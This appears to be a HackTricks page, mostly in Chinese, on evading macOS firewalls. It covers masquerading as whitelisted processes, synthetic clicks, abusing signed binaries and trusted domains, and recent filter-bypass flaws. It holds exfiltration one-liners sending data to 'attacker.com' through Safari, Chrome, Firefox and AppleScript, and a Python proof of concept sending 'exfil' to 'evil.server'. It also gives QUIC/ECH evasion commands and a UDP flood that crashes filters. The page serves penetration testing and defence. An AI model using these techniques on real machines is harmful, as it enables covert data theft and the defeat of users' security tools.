# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## 发现的技术

以下技术已在某些 macOS firewall 应用中被证实可行。

### Abusing whitelist names

- 例如将 malware 命名为知名的 macOS 进程名称，例如 **`launchd`**

### Synthetic Click

- 如果 firewall 向用户请求权限，让 malware **点击“允许”**

### **Use Apple signed binaries**

- 比如 **`curl`**，也可以使用其他诸如 **`whois`**

### Well known apple domains

firewall 可能允许连接到知名的 apple 域名，例如 **`apple.com`** 或 **`icloud.com`**。iCloud 也可能被用作 C2。

### Generic Bypass

一些尝试绕过 firewalls 的思路

### Check allowed traffic

了解被允许的流量将帮助你识别可能被列入白名单的域名，或哪些应用被允许访问它们。
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### 滥用 DNS

DNS 解析是通过已签名的应用程序 **`mdnsreponder`** 完成的，该应用很可能被允许连接到 DNS 服务器。

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### 通过浏览器应用

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 最近的 macOS 防火墙绕过漏洞 (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
2024年7月，Apple 修补了 Safari/WebKit 中的一个关键漏洞，该漏洞破坏了由 Screen Time 家长控制使用的系统范围“网页内容过滤器”。
一个特制的 URI（例如，带有双重 URL 编码的 “://”）不会被 Screen Time 的 ACL 识别，但会被 WebKit 接受，因此请求会未经过滤地发送。任何能够打开 URL 的进程（包括 sandboxed 或 unsigned code）因此可以访问用户或 MDM 配置文件明确阻止的域名。

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) 规则顺序漏洞（早期 macOS 14 “Sonoma”）
在 macOS 14 的测试周期中，Apple 在围绕 **`pfctl`** 的用户空间包装器中引入了一个回归。
使用 `quick` 关键字添加的规则（由许多 VPN kill-switches 使用）被静默忽略，导致流量 leaks，即使当 VPN/firewall GUI 报告为 *blocked*。该漏洞已由多家 VPN 供应商确认并在 RC 2（build 23A344）中修复。

快速 leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### 滥用 Apple 签名的辅助服务（遗留 – pre-macOS 11.2）
在 macOS 11.2 之前，**`ContentFilterExclusionList`** 允许大约 50 个 Apple 二进制文件，例如 **`nsurlsessiond`** 和 App Store，绕过所有通过 Network Extension framework 实现的 socket-filter 防火墙（如 LuLu、Little Snitch 等）。
恶意软件可以简单地启动一个被排除的进程——或向其注入代码——并通过已被允许的 socket 将自己的流量隧道化。Apple 在 macOS 11.2 中已完全移除该排除列表，但在无法升级的系统上该技术仍然适用。

示例概念验证（pre-11.2）：
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH 绕过 Network Extension 域过滤 (macOS 12+)
NEFilter Packet/Data Providers 依赖于 TLS ClientHello 中的 SNI/ALPN。使用 **HTTP/3 over QUIC (UDP/443)** 和 **Encrypted Client Hello (ECH)** 时，SNI 保持加密，NetExt 无法解析流量，主机名规则通常会 fail-open，允许 malware 在不接触 DNS 的情况下访问被阻止的域名。

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.

### macOS 15 “Sequoia” Network Extension 不稳定性（2024–2025）
早期的 15.0/15.1 构建会导致第三方 **Network Extension** 过滤器（LuLu、Little Snitch、Defender、SentinelOne 等）崩溃。当过滤器重启时，macOS 会丢弃其流规则，许多产品会 fail‑open。用数千个短的 UDP flows 泛滥过滤器（或强制 QUIC/ECH）可以反复触发崩溃，并在 GUI 仍然声称防火墙正在运行时留下一个用于 C2/exfil 的窗口。

Quick reproduction (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 适用于现代 macOS 的工具提示

1. 检查 GUI 防火墙生成的当前 PF 规则：
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. 枚举已经拥有 *outgoing-network* entitlement 的二进制文件（可用于搭便车）：
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. 使用 Objective-C/Swift 以编程方式注册你自己的 Network Extension content filter。
A minimal rootless PoC that forwards packets to a local socket is available in Patrick Wardle’s **LuLu** source code.

## References

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
